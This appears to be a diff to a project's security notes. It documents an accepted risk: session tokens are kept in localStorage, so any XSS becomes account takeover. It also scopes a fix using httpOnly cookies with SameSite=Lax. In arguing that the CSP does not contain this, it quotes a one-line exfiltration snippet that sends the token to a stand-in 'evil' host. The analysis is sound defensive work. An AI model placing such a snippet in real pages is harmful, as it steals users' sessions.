@@ -175,6 +175,61 @@ Notes for anyone touching this:
   the tables, a stored digest is not replayable, the migration keeps existing
   sessions valid and is idempotent).
 
+### Tokens in the browser: `localStorage`, not a cookie — accepted risk
+
+The section above is about tokens on *our* disk. In the *browser* the session token
+sits in `localStorage` under `stagifyAuthToken`
+([`public/scripts/auth.js`](../../public/scripts/auth.js)), which JavaScript on the
+page can read. **Any XSS in a page that runs `auth.js` is therefore full account
+takeover**, not merely defacement, and the CSP does not contain it: `connectSrc` and
+`imgSrc` are both `'https:'`
+([`lib/http/app-middleware.js`](../../lib/http/app-middleware.js)), so a stolen token
+can be posted to any HTTPS host. This is a known, accepted gap — recorded here so the
+next reviewer finds the analysis instead of re-deriving it.
+
+**Why the CSP is not the fix.** Narrowing `connectSrc` alone is theatre while
+`imgSrc: 'https:'` stands — `new Image().src = 'https://evil/?t=' + token` exfiltrates
+just as well, and `form-action` and top-level navigation remain besides. Both
+directives are load-bearing for the Google Ads tag
+([`public/scripts/gtag.js`](../../public/scripts/gtag.js) — the `googletagmanager`,
+`googleadservices`, `www.google.com` and `*.doubleclick.net` measurement beacons ride
+on them, as the `scriptSrc` comment in `app-middleware.js` notes), so tightening
+them risks silently losing conversion data — a missed beacon domain produces no error.
+An allowlist is worth doing eventually, but as defence in depth, not as this fix.
+
+**Why it is not a one-line change.** The real fix is an `httpOnly` cookie, and the
+security benefit arrives only once the browser stops holding a readable token —
+cookie plumbing on its own buys nothing. Scope, measured:
+
+- **Server: 2 read sites**, already funnelled — `getAuthUserFromRequest`
+  ([`lib/services/auth-helpers.js`](../../lib/services/auth-helpers.js)) and the
+  logout/me extraction in [`routes/auth.js`](../../routes/auth.js). Plus set-cookie on
+  login / register-verify / google-login and clear on logout.
+- **Browser: 14 files, 21 send sites**, all mechanical deletions — `fetch` already
+  sends same-origin cookies by default, so removing the `Authorization` header and the
+  `authToken` body field is the whole change.
+- **Tests: `e2e/fixtures.js` is the only place that fakes a signed-in session**, so the
+  browser suite costs one fixture, not twenty specs.
+- **There are no cookies in this app today** — no `cookie-parser`, no `res.cookie`
+  anywhere. This would be the first.
+
+**The part that is easy to miss: it opens a CSRF surface.** With no auth cookie, the app
+is structurally immune to CSRF today. The moment a session cookie is honoured, a
+cross-site form POST carries it, so `SameSite=Lax` has to land *in the same commit* as
+the cookie, not afterwards. Lax is sufficient here — both cross-site returns were
+checked: Stripe → `/plus-welcome.html` is a top-level GET (Lax sends the cookie, the
+user stays signed in), and Google sign-in POSTs from our own page (same-site). No
+CSRF-token machinery is required.
+
+**The server can keep accepting `Authorization: Bearer` afterwards.** Once the browser
+holds nothing readable, an XSS gains nothing from that path, and it preserves the
+documented affordance in [`endpoints.md`](../reference/endpoints.md) plus the existing
+non-browser callers. Migrating does *not* mean removing it.
+
+**Rollout.** Every currently signed-in user holds a `localStorage` token. Either accept
+a one-off forced sign-out on deploy, or add a one-time boot exchange (POST the old
+token, receive the cookie, clear `localStorage`) and delete that path a month later.
+
 ### Password reset revokes sessions
 
 `completePasswordReset` ([`lib/data/auth-store.js`](../../lib/data/auth-store.js))
@@ -345,3 +400,8 @@ export endpoints that read them are `endpoint_key`-gated.
   constraint.
 - **`chat-upload` accepts any file type** (size-capped only).
 - **No at-rest encryption** for the `/data` files beyond the host disk.
+- **Session token lives in `localStorage`, not an `httpOnly` cookie** — so an XSS is
+  account takeover, and `connectSrc`/`imgSrc: 'https:'` won't stop exfiltration. The
+  fix, its true scope, and the CSRF surface it opens are written up under
+  [Tokens in the browser](#tokens-in-the-browser-localstorage-not-a-cookie--accepted-risk).
+  Deliberately deferred: it is a project, not a patch.
